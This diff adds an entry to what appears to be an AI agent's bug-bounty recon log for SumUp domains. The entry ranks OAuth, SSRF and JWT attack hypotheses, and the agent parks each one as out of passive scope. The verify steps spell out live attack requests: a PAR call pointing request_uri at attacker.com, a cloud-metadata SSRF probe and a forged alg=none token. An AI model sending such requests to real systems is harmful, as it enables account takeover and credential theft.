@@ -607,3 +607,55 @@ testability: PASSIVE
 [LEARN] ACCEPTED BUSLOGIC @ api.sumup.com: All versioned paths (/v0,/v0.1,/v1,/v2,/beta,/internal) return 404 unauthenticated — API fully gated at gateway
 [LEARN] REJECTED SSRF @ portal.sumup.com: Third-party CNAME (iriscrm.com) confirmed but webhook/callback parameters not discovered passively; supply-chain risk unconfirmed in-scope
 [RISK] sumup: 68 — Auth server (auth.sumup.com) exposes critical OAuth configuration (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. However, all high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client — no passive exploit path. API gateway fully gated. Vercel me.sumup.com adds non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed — now returns 200 (live page) enabling parameter enum. Admin panel hardened. Financial attack surface concentrated but access-controlled.
+## 2026-09-05 08:43:45 UTC [target] (model nemotron3)
+[NEW] portal.sumup.com returns 200 with React CRM login page (iriscrm.com) — live parameter enumeration surface now accessible
+[CHANGED] auth.sumup.com/oauth2/auth with request_object returns 405 (rejects at method level before validation)
+[CHANGED] me.sumup.com/api/sso/callback returns 307 (not 403) on anonymous GET — redirect to OAuth flow
+[CHANGED] auth.sumup.com/oauth2/par and /oauth2/device return 400 on POST — routed but require client authentication params
+[CHANGED] api.sumup.com/authorize returns 404 for ALL legacy client_ids — legacy OAuth surface fully dead
+[PRIO] auth.sumup.com,8.1,a=9,b=10,t=9,g=3,c=8,f=8
+[PRIO] portal.sumup.com,6.8,a=7,b=7,t=6,g=5,c=6,f=7
+[PRIO] me.sumup.com,6.5,a=7,b=8,t=6,g=5,c=7,f=7
+[PRIO] api.sumup.com,5.5,a=7,b=10,t=4,g=2,c=7,f=5
+[PRIO] admin.sumup.com,4.8,a=5,b=7,t=3,g=2,c=6,f=5
+[HYP] OAuth PAR request_uri registration bypass via unauthenticated client
+class: OATH
+asset: auth.sumup.com
+confidence: 50
+reasoning: Discovery shows require_request_uri_registration=true, PAR endpoint routed (400 on POST), request_uri_parameter_supported=true. If PAR accepts request_uri without client_auth binding, attacker could register malicious redirect_uri
+evidence_needed: Successful PAR POST returning request_uri usable in authorize flow without client credentials
+verify_steps: POST https://auth.sumup.com/oauth2/par with client_id=dashboard&redirect_uri=https://dashboard.sumup.com/callback&request_uri=https://attacker.com/malicious.json&response_type=code&scope=classic → observe if request_uri accepted; then GET https://auth.sumup.com/oauth2/auth?client_id=dashboard&request_uri=urn:ietf:params:oauth:request_uri:...
+impact: OAuth code theft via malicious request_uri → merchant account takeover — CRITICAL
+testability: PASSIVE
+[HYP] portal.sumup.com (iriscrm.com) webhook/callback SSRF via supply-chain parameter injection
+class: SSRF
+asset: portal.sumup.com
+confidence: 45
+reasoning: portal.sumup.com CNAME → sumup.iriscrm.com (third-party CRM). Returns 200 with React app. CRM platforms typically have webhook/callback/config endpoints accepting URLs. CSP allows *.iriscrm.com for connect-src/frame-src/img-src
+evidence_needed: Discovery of URL/redirect/webhook/callback parameter on portal.sumup.com or iriscrm.com endpoints; SSRF payload execution against 169.254.169.254
+verify_steps: GET https://portal.sumup.com/ → enumerate all forms/links/endpoints for parameters (url, redirect, callback, webhook, next, return_to, target). GET https://sumup.iriscrm.com/ → same enumeration. If parameter found, test with http://169.254.169.254/latest/meta-data/ (passive enum only)
+impact: Cloud metadata exposure → IAM credentials, instance identity → full AWS account compromise — CRITICAL
+testability: PASSIVE (enum) → HUMAN_ONLY (exploit requires in-scope confirmation)
+[HYP] me.sumup.com Vercel /api/sso/callback state parameter deserialization via alg=none confusion
+class: AUTH
+asset: me.sumup.com
+confidence: 40
+reasoning: /api/sso/callback is Vercel serverless function (non-Cloudflare). OAuth state is HS256-signed JWT carrying appState. OIDC discovery shows request_object_signing_alg_values_supported includes "none" + request_parameter_supported=true. If state validation uses same JWT parser with alg confusion, could bypass auth
+evidence_needed: Non-403/307 response (200/500) with crafted state parameter revealing deserialization error or bypass
+verify_steps: GET https://me.sumup.com/api/sso/callback?state=eyJhbGciOiJub25lIn0.eyJhcHBTdGF0ZSI6e30nfQ. → observe status/error. GET https://me.sumup.com/api/sso/callback?state=malformed → observe error body for stack traces. OPTIONS https://me.sumup.com/api/sso/callback → capture CORS headers
+impact: Auth bypass on merchant self-service portal → OAuth app registration abuse, broad-scope token issuance — HIGH
+testability: PASSIVE
+[PARKED] OAuth PAR request_uri registration bypass via unauthenticated client: Confidence 50 but PAR requires client_auth (dashboard client rejects unauthenticated); request_uri registration likely bound to authenticated client context
+[PARKED] portal.sumup.com SSRF via iriscrm.com: Confidence 45 but third-party domain (iriscrm.com) requires explicit in-scope confirmation; no webhook parameters discovered passively in React bundle
+[PARKED] me.sumup.com state deserialization flaw: Confidence 40 but all anonymous requests return 307 at edge; requires valid session to reach app logic; state JWT uses HS256 (not alg=none)
+[FINAL] No hypotheses survive filtering — all require AUTH_HELPED or HUMAN_ONLY verification beyond passive capabilities
+[NEXT] RAG: Fetch SumUp bug bounty program scope.yml (or program page) to confirm if portal.sumup.com / iriscrm.com is in-scope for SSRF testing
+[LEARN] REJECTED OATH @ api.sumup.com/authorize: Legacy OAuth authorize endpoint returns 404 for all known legacy SDK client_ids (sumup-ios-sdk, sumup.pos, reader, sales, virtual-terminal) — no client_id oracle, no loose redirect_uri
+[LEARN] ACCEPTED AUTH @ auth.sumup.com: token_endpoint_auth_methods_supported includes "none" but dashboard client rejects unauthenticated token requests — "none" likely restricted to specific client configs not publicly registrable
+[LEARN] ACCEPTED OAUTH @ auth.sumup.com: PAR (/oauth2/par) and device flow (/oauth2/device) endpoints ARE routed and respond to POST (not 404) but require client authentication
+[LEARN] ACCEPTED OATH @ auth.sumup.com: request_object_signing_alg_values_supported includes "none" + request_parameter_supported=true — algorithm confusion vector documented but untestable without valid client flow
+[LEARN] ACCEPTED AUTH @ me.sumup.com: Vercel-served asset confirmed; all anonymous /api/* routes return 307 to OAuth flow — no debug endpoints or permissive CORS found passively
+[LEARN] REJECTED MISCONFIG @ me.sumup.com: No CORS misconfiguration on /api/sso/callback (307 redirect, no CORS headers)
+[LEARN] ACCEPTED BUSLOGIC @ api.sumup.com: All versioned paths (/v0,/v0.1,/v1,/v2,/beta,/internal) return 404 unauthenticated — API fully gated at gateway
+[LEARN] REJECTED SSRF @ portal.sumup.com: Third-party CNAME (iriscrm.com) confirmed but webhook/callback parameters not discovered passively; supply-chain risk unconfirmed in-scope
+[RISK] sumup: 68 — Auth server (auth.sumup.com) exposes critical OAuth configuration (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. However, all high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client — no passive exploit path. API gateway fully gated. Vercel me.sumup.com adds non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed — now returns 200 (live page) enabling parameter enum. Admin panel hardened. Financial attack surface concentrated but access-controlled.
